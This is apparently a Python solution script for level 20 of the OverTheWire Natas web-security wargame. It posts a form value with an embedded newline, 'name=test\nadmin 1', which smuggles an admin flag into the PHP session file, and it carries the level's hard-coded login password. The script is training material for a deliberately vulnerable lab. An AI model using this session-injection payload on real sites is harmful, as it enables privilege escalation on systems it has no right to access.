import base64
import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas20', 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw')

url = "http://natas20.natas.labs.overthewire.org/index.php?debug"


def encode_cookie(cookie: str) -> str:
    encoded_cookie = base64.b16encode(cookie.encode('ascii')).lower()
    return encoded_cookie.decode('ascii')


def send_request() -> str:
    cookie = "PHPSESSID=" + "admin"
    headers = {'Content-Type': 'application/x-www-form-urlencoded',
               'Cookie': cookie}
    body = "name=test\nadmin 1"
    response = requests.post(url, headers=headers,
                             auth=basic_auth, data=body, verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request()
    text = send_request()
    print(text)
